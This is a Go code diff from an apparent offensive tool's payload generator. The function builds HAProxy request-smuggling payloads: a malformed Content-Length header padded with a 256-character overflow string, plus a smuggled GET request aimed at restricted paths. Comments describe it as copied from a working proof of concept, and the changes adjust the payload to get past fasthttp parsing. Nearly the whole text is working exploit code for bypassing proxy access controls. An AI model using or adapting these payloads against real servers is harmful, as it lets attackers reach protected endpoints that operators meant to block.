@@ -47,15 +47,17 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 
 	// Generate overflow pattern - exact pattern from working PoC
 	// Content-Length0 + 256 'a' characters
-	overflowPattern := "0" + strings.Repeat("a", 256)
+	overflowPattern := "q" + strings.Repeat("a", 256)
 	malformedHeaderName := "Content-Length" + overflowPattern
 
 	// For each public path, try to smuggle a request to the target path
 	for _, publicPath := range publicPaths {
-		// Craft the smuggled request - exact format from working PoC
-		smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nh:GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
-			path, publicPath, host)
+		// Craft the smuggled request - avoid \r\n\r\n in body as fasthttp interprets it as end of request
+		smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
+			publicPath, host)
 
+		// Use a body that doesn't contain \r\n\r\n to avoid fasthttp parsing issues
+		//smuggledRequest := fmt.Sprintf("x=123&smuggle=1\r\n\r\n")
 		// Calculate the content length for the smuggled request
 		calculatedContentLength := len(smuggledRequest)
 
@@ -78,8 +80,16 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 				// 1. Malformed header FIRST - NO VALUE after colon (like working PoC)
 				{
 					Header: malformedHeaderName, // e.g., "Content-Length0aaa..." (no colon, request.go adds it)
-					Value:  "",                  // EMPTY VALUE - this is critical!
+					Value:  "0",                 // EMPTY VALUE - this is critical!
 				},
+				// {
+				// 	Header: "Content-Type: application/x-www-form-urlencoded",
+				// 	Value:  "application/x-www-form-urlencoded",
+				// },
+				// {
+				// 	Header: "Content-Type",
+				// 	Value:  "application/x-www-form-urlencoded",
+				// },
 				// 2. Real Content-Length will be deferred to LAST position in request.go
 				{
 					Header: "Content-Length",
